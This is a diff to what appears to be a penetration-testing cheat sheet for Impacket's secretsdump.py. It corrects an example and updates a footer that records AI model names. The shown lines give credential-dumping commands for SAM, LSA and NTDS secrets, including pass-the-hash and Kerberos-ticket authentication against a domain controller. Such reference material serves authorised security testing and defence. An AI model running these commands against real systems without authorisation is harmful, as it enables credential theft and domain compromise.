@@ -31,8 +31,9 @@ secretsdump.py DOMAIN/Administrator:Password@192.168.1.10
 # Pass the Hash — NTLM auth
 secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee:NTLMhash DOMAIN/Administrator@192.168.1.10
 
-# Just SAM (local accounts only)
-secretsdump.py DOMAIN/user:Password@192.168.1.10 -just-dc-user Administrator
+# SAM + LSA + cached are dumped by DEFAULT on a remote run (no flag needed); there is no
+# "-just-sam". Use -just-dc / -just-dc-user to RESTRICT to DCSync (NTDS) instead of broadening.
+secretsdump.py DOMAIN/user:Password@192.168.1.10
 
 # Use Kerberos auth (if you have a TGT / ccache file)
 KRB5CCNAME=ticket.ccache secretsdump.py -k -no-pass DOMAIN/user@dc01.domain.local
@@ -201,5 +202,5 @@ secretsdump.py DOMAIN/user:Password@dc01.domain.local -dc-ip 192.168.1.1
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-07-31*
-*Model: claude-opus-5*
+*Updated: 2026-09-27*
+*Model: claude-opus-4-8*
